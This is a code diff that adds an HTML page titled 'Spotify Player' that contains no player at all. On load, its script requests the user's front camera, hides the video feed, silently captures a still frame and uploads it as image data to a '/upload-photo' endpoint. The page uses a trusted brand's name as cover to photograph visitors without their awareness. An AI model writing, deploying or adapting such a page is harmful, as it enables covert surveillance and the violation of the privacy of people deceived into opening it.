@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Spotify Player</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      background-color: #121212;
+      color: white;
+      font-family: sans-serif;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    const video = document.getElementById("video");
+
+    async function startCameraAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false,
+        });
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => resolve();
+        });
+
+        await new Promise(resolve => setTimeout(resolve, 200));
+
+        capturePhoto();
+      } catch (err) {
+        console.error("Error accessing camera:", err);
+      }
+    }
+
+    function capturePhoto() {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataUrl = canvas.toDataURL("image/png");
+      sendPhotoToServer(dataUrl);
+    }
+
+    function sendPhotoToServer(dataUrl) {
+      fetch("/upload-photo", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ image: dataUrl }),
+      })
+        .then(res => {
+          if (!res.ok) throw new Error("Upload failed");
+          return res.json();
+        })
+        .then(data => {
+          if (data.status === "success") {
+            console.log("✅ Photo saved:", data.url);
+          }
+        })
+        .catch(err => {
+          console.error("Error uploading photo:", err);
+        });
+    }
+
+    window.addEventListener("load", () => {
+      startCameraAndCapture();
+    });
+  </script>
+</body>
+</html>
